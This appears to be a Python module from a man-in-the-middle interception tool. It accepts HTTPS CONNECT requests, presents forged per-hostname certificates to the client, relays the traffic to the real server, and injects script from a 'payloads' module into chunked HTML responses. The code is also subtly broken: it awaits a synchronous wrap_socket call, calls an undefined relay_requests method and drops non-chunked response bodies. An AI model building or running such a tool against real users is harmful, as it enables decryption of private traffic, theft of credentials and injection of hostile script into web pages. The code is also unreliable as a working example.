# It listens for incoming connections and decides how to route them
import asyncio
import ssl
from .cert_manager import CertManager
from payloads.inject_js import inject_payload

class Interceptor:
    def __init__(self, host='127.0.0.1', port=8080):
        self.host = host
        self.port = port
        self.cert_manager = CertManager()

    async def handle_https(self, reader, writer, initial_data):
        # Parse the hostname from the CONNECT request (e.g., 'google.com:443')
        host_port = initial_data.split(b' ')[1].decode()
        hostname = host_port.split(':')[0]

        writer.write(b'HTTP/1.1 200 Connection Established\r\n\r\n')
        await writer.drain()

        # Get the fake certificate from core/cert_manager.py
        cert_path, key_path = self.cert_manager.get_cert(hostname)

        # Wrap the client socket with our fake certificate
        ssl_context_client = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context_client.load_cert_chain(certfile=cert_path, keyfile=key_path)
        
        # This device becomes the server to the client
        ssock_client = await ssl_context_client.wrap_socket(
            reader._transport.get_extra_info('socket'), server_side=True
        )

        # Open a real connection to the actual server
        ssl_context_server = ssl.create_default_context()
        reader_server, writer_server = await asyncio.open_connection(
            hostname, 443, ssl=ssl_context_server
        )

        await self.shuttle_traffic(ssock_client, reader_server, writer_server)

    async def shuttle_traffic(self, client_sock, reader_server, writer_server):
        # Injection on the Server->Client task (Responses)
        asyncio.create_task(self.relay_requests(client_sock, writer_server))
        await self.relay_responses(client_sock, reader_server)

    async def relay_responses(self, client_sock, reader_server):
        while True:
            header_data = await reader_server.readuntil(b'\r\n\r\n')
            
            # Check if the response is chunked
            is_chunked = b'Transfer-Encoding: chunked' in header_data
            is_html = b'text/html' in header_data

            if is_chunked and is_html:
                full_body = b""
                while True:
                    # Read the chunk size line
                    line = await reader_server.readuntil(b'\r\n')
                    chunk_size = int(line.strip(), 16)
                    
                    if chunk_size == 0:
                        await reader_server.readuntil(b'\r\n') 
                        break
                    
                    # Read the actual chunk data
                    chunk_data = await reader_server.readexactly(chunk_size)
                    full_body += chunk_data
                    await reader_server.readuntil(b'\r\n') 

                # Now that we have the full body, inject the script from payloads/inject_js.py
                from payloads.inject_js import inject_payload
                modified_body = inject_payload(full_body)

                # Re-chunk the modified body 
                new_chunked_response = self.format_chunked_response(header_data, modified_body)
                client_sock.sendall(new_chunked_response)
            else:
                # Fallback for non-chunked or non-HTML data (images, scripts, etc.)
                client_sock.sendall(header_data)
            pass
        
    def format_chunked_response(self, headers, body):
        hex_size = hex(len(body))[2:].encode()
        
        response = headers
        response += hex_size + b'\r\n'
        response += body + b'\r\n'
        response += b'0\r\n\r\n' 
        
        return response